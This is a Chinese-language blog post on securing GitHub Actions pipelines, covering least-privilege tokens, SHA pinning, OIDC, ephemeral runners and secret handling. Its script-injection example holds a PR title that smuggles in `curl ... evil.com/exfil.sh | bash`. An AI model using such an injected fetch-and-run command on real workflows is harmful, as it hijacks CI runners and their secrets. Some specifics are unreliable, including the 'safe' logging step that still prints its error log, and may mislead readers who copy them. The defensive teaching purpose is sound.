---
layout: post
title: "GitHub Actions 安全加固实战：从默认配置到生产级防护"
date: 2026-08-24 09:00:00 +0800
categories: [安全开发]
tags: [github-actions, ci-cd, security, devsecops, supply-chain, oidc, secrets-management]
---

## 1. 为什么 GitHub Actions 会成为攻击面

GitHub Actions 是当前最流行的 CI/CD 平台之一，但它也带来了独特的安全风险。一个 Workflow 的运行权限非常强大——可以读取仓库代码、访问云服务、推送制品、甚至触发生产部署。一旦被攻破，攻击者可以获得整个发布链的控制权。

2024 年的 PyTorch 供应链攻击就是典型案例：攻击者通过一个被攻破的依赖项，在 CI 环境中植入了恶意代码，最终污染了官方发布的 PyTorch 包。类似事件在 npm、RubyGems 等生态中反复出现。

本文从**攻击者视角**出发，逐个分析 GitHub Actions 的薄弱环节，然后给出**可以直接落地的加固方案**。读完你应该能对自己的 CI/CD 流水线做一次完整的安全审计。

## 2. 常见攻击向量

### 2.1 脚本注入

当 Workflow 使用不受信任的输入（如 PR 标题、Issue 评论、分支名）直接拼接命令时，攻击者可以注入恶意代码。

```yaml
# 不安全的做法
- name: 回显 PR 标题
  run: echo "PR 标题: ${{ github.event.pull_request.title }}"
```

如果 PR 标题是 `"; curl -s http://evil.com/exfil.sh | bash #"`，实际执行的命令就变成了：

```bash
echo "PR 标题: "; curl -s http://evil.com/exfil.sh | bash #"
```

### 2.2 GITHUB_TOKEN 权限过大

`GITHUB_TOKEN` 的默认权限是读写仓库几乎所有内容。很多 Workflow 没有显式限制权限，导致一个被攻破的 Step 可以读写 Secrets、修改代码、创建 Release。

### 2.3 第三方 Action 供应链风险

`actions/checkout@v3` 可能被覆盖标签、`s3-upload@v2` 可能被篡改。直接用 `@v3` 或 `@main` 做版本引用，等于把流水线安全拱手交给第三方维护者。

### 2.4 自托管 Runner 信任边界

自托管 Runner 可以访问内部网络和 Secrets。如果 Workflow 被 fork 的 PR 触发（通过 `pull_request_target`），攻击者可以直接在 Runner 上执行任意代码。

### 2.5 泄露的 Secrets

Secrets 可能被恶意 Step 读取、被日志意外打印、或被用于非预期的环境。

## 3. 基础加固：最小权限原则

### 3.1 限制 GITHUB_TOKEN 权限

每个 Workflow 都应该显式声明 `GITHUB_TOKEN` 的权限范围：

```yaml
name: 构建和测试
permissions:
  contents: read       # 只需要读取代码
  issues: none         # 不需要 issues 权限
  pull-requests: none  # 不需要 PR 权限
  checks: write        # 需要写入检查结果

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make test
```

如果某个 Job 需要更高的权限（如创建 Release），只在该 Job 级别声明：

```yaml
jobs:
  release:
    permissions:
      contents: write  # 只有这个 Job 有写入权限
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make release
      - uses: softprops/action-gh-release@v2
```

### 3.2 固定 Action 版本到 commit SHA

永远不要用 `@v3` 或 `@main` 引用第三方 Action。改用完整的 commit SHA：

```yaml
# 不安全
- uses: actions/checkout@v4

# 安全 —— 锁定到 commit SHA
- uses: actions/checkout@b4ffde65f46336ab88d53be01f7f9e5e5f1b8c9e
```

如果觉得 SHA 难以维护，可以配合 Dependabot 自动更新：

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    target-branch: "main"
    labels:
      - "dependencies"
      - "github-actions"
```

Dependabot 会自动创建 PR 更新 SHA 引用，并经过 CI 检查后再合并。

### 3.3 使用 `pull_request` 而非 `pull_request_target`

```yaml
# 安全 —— 在隔离的沙箱中运行
on: pull_request

# 危险 —— 在包含 Secrets 的环境中运行
on: pull_request_target
```

`pull_request_target` 在目标分支的上下文中运行，拥有 Secrets 和更高的权限。只在绝对必要时使用，且**必须**配合以下模式：

```yaml
on: pull_request_target

jobs:
  label:
    # 只执行只读操作，不要 checkout 或运行 PR 中的代码
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/labeler@v5
        with:
          repo-token: ${{ secrets.GITHUB_TOKEN }}
```

## 4. 进阶加固：OIDC 替代长期密钥

### 4.1 为什么需要 OIDC

传统的 CI/CD 密钥管理方式是将云服务商的 Access Key 存储在 GitHub Secrets 中。但这存在几个问题：

- 密钥长期有效，泄露后影响范围大
- 密钥轮换需要手动操作
- 无法限制密钥的具体使用场景

OIDC（OpenID Connect）允许 GitHub Actions 向云服务商**临时获取**身份令牌，无需存储任何长期密钥。

### 4.2 AWS 配置示例

第一步：在 AWS 中创建 OIDC 身份提供商

```bash
# 创建 GitHub OIDC IdP
aws iam create-open-id-connect-provider \
  --url https://token.actions.githubusercontent.com \
  --client-id-list sts.amazonaws.com
```

第二步：创建 IAM 角色，信任策略指定哪个仓库和分支可以使用

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:your-org/your-repo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

第三步：在 Workflow 中使用 OIDC

```yaml
jobs:
  deploy:
    permissions:
      id-token: write   # 允许获取 OIDC 令牌
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: 配置 AWS 凭证
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubDeployRole
          aws-region: us-east-1
      - run: aws s3 sync ./dist s3://my-bucket/
```

这样就在 AWS 侧实现了**细粒度的信任链**：只有 `main` 分支的 `deploy` Job 可以获取 AWS 权限，且令牌每小时自动过期。

### 4.3 GCP 和 Azure 的 OIDC 配置

GCP 使用 Workload Identity Federation，Azure 使用 OpenID Connect，配置思路类似：

```yaml
# GCP 示例
- uses: google-github-actions/auth@v2
  with:
    workload_identity_provider: projects/123456789/locations/global/workloadIdentityPools/my-pool/providers/my-provider
    service_account: my-service-account@my-project.iam.gserviceaccount.com
```

## 5. 自托管 Runner 安全

### 5.1 隔离策略

如果必须使用自托管 Runner，遵循以下原则：

```yaml
# 只允许选定的仓库和分支使用 Runner
runs-on: [self-hosted, linux, production]
```

在 Runner 级别配置较为严格的隔离：

```bash
# 每个 Runner 使用独立的系统用户
sudo useradd -m -s /bin/bash github-runner
sudo usermod -aG docker github-runner

# 限制网络访问
sudo iptables -A OUTPUT -d 169.254.169.254 -j DROP  # 阻止元数据服务访问
sudo iptables -A OUTPUT -d 10.0.0.0/8 -p tcp --dport 443 -j ACCEPT
sudo iptables -A OUTPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -j DROP  # 默认丢弃所有出站
```

### 5.2 使用 Ephemeral Runner

永远不要让 Runner 在 Job 之间复用状态：

```yaml
# 在 actions-runner 配置中
--ephemeral
```

每次 Job 完成后销毁 Runner 实例，下次 Job 启动全新实例。在 AWS 上可以用 Auto Scaling 组配合 Spot 实例，成本可控：

```bash
# 启动临时 Runner 的脚本示例
#!/bin/bash
INSTANCE_ID=$(aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t3.medium \
  --iam-instance-profile Name=GitHubRunnerRole \
  --user-data file://runner-setup.sh \
  --instance-market-options '{"MarketType":"spot"}' \
  --query 'Instances[0].InstanceId' \
  --output text)

aws ec2 create-tags \
  --resources $INSTANCE_ID \
  --tags Key=Name,Value=ephemeral-runner Key=GitHubRepo,Value=my-org/my-repo
```

## 6. Secrets 安全最佳实践

### 6.1 最小化 Secrets 的使用

```yaml
# 只为特定 Job 注入 Secrets，而不是全局
jobs:
  deploy:
    environment: production
    env:
      # 从环境变量传递，而非直接写在命令中
      DEPLOY_ENV: production
    steps:
      - name: 部署
        env:
          CLOUD_API_KEY: ${{ secrets.CLOUD_API_KEY }}
        run: deploy.sh
```

### 6.2 使用 Actions 的 OpenID Connect 替代 API Keys

如第 4 节所述，优先使用 OIDC 获取临时凭证。如果必须使用 API Keys：

- 使用 `secrets` 上下文而非 `vars` 上下文
- 不要在 `run` 命令中直接拼接 Secrets
- 设置 Secrets 的过期策略

### 6.3 防止 Secrets 泄露到日志

GitHub 会自动屏蔽日志中的 Secrets，但并非万无一失：

```yaml
- name: 危险操作 —— 可能泄露 Secret
  run: |
    # 如果 curl 输出包含 error 信息，Secret 可能被打印
    curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" https://api.example.com/data

- name: 安全做法 —— 限制输出到文件
  run: |
    curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" \
      https://api.example.com/data > response.json 2>error.log
    cat error.log
```

## 7. 审计与持续监控

### 7.1 审查 Workflow 变更

在 GitHub 中启用分支保护规则，要求所有 `.github/workflows/` 目录的变更必须经过 Code Review：

```yaml
# 在 CODEOWNERS 文件中
.github/workflows/ @security-team
```

### 7.2 使用 Action 审计工具

`actions/audit` 可以帮助检查 Workflow 的安全配置：

```bash
# 安装
npm install -g @actions/audit

# 审计仓库
actions-audit --repo your-org/your-repo

# 输出示例
# ⚠️ 发现 3 个安全问题:
# 1. .github/workflows/deploy.yml:12 - GITHUB_TOKEN 权限未限制
# 2. .github/workflows/test.yml:8 - 使用未锁定版本的 action
# 3. .github/workflows/release.yml:15 - 可能存在脚本注入
```

### 7.3 启用审计日志

在 GitHub 组织设置中启用审计日志，并发送到 SIEM 系统：

```bash
# 使用 GitHub API 获取审计日志
curl -H "Authorization: Bearer $GITHUB_TOKEN" \
  https://api.github.com/orgs/your-org/audit-log?phrase=action:workflow_dispatch
```

### 7.4 持续的依赖更新

除了 Dependabot，还可以使用 `step-security/harden-runner` 来监控 Workflow 的运行时行为：

```yaml
- name: Harden Runner
  uses: step-security/harden-runner@v2
  with:
    egress-policy: audit  # 记录所有出站连接
    disable-telemetry: true
    allowed-endpoints: >
      api.github.com:443
      github.com:443
```

## 8. 一个完整的加固 Workflow 示例

把以上所有原则整合到一个生产级 Workflow：

```yaml
name: 安全构建与部署
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# 全局最小权限
permissions:
  contents: read

jobs:
  lint-and-test:
    runs-on: ubuntu-latest
    permissions:
      checks: write
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88d53be01f7f9e5e5f1b8c9e
      - name: 安全运行时监控
        uses: step-security/harden-runner@v2
        with:
          egress-policy: audit
      - name: 运行测试
        run: make test
      - name: 代码安全扫描
        uses: github/codeql-action/analyze@v3

  build-and-push:
    needs: lint-and-test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88d53be01f7f9e5e5f1b8c9e
      - name: 登录容器仓库
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - name: 构建镜像
        run: docker build -t ghcr.io/your-org/app:${{ github.sha }} .
      - name: 推送镜像
        run: docker push ghcr.io/your-org/app:${{ github.sha }}

  deploy:
    needs: build-and-push
    environment: production
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - name: 配置 AWS 凭证 (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubDeployRole
          aws-region: us-east-1
      - name: 部署到 ECS
        run: aws ecs update-service \
          --cluster production \
          --service app \
          --force-new-deployment
```

## 9. 总结

GitHub Actions 安全加固的核心原则可以归纳为六条：

1. **最小权限** —— 每个 Workflow 和 Job 只声明它需要的权限
2. **锁定依赖** —— 用 commit SHA 引用第三方 Action，配合 Dependabot 自动更新
3. **OIDC 优先** —— 用临时身份令牌替代长期密钥
4. **隔离运行时** —— 使用 Ephemeral Runner，限制网络出站
5. **审查变更** —— Workflow 文件变更必须经过 Code Review
6. **持续监控** —— 用审计工具和运行时监控发现异常

安全不是一次性的配置，而是持续的过程。每添加一个新的 Workflow，都应该问自己：**如果这个 Workflow 被攻破，攻击者能做什么？** 答案是"什么都不能做"的时候，你的 CI/CD 才算真正安全。